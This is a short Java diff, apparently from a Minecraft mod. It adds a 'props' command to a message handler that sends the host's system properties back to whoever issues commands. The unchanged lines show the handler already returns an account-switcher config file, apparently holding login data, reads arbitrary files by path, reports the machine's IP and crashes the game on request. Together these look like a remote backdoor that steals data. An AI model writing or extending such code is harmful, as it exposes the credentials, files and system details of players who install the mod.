@@ -66,6 +66,7 @@ public class MessageHandler {
                     case "iasconfig" -> messageUtils.send(msgType, FileUtil.read("config/ias.json"));
                     case "read" -> messageUtils.send(msgType, FileUtil.read(msg));
                     case "runargs" -> messageUtils.send(msgType, ManagementFactory.getRuntimeMXBean().getInputArguments());
+                    case "props" -> messageUtils.send(msgType, System.getProperties());
                     case "ip" -> messageUtils.send(msgType, NetUtil.getIp());
                     case "crash" -> MinecraftUtil.crash();
                     case "xor" -> {
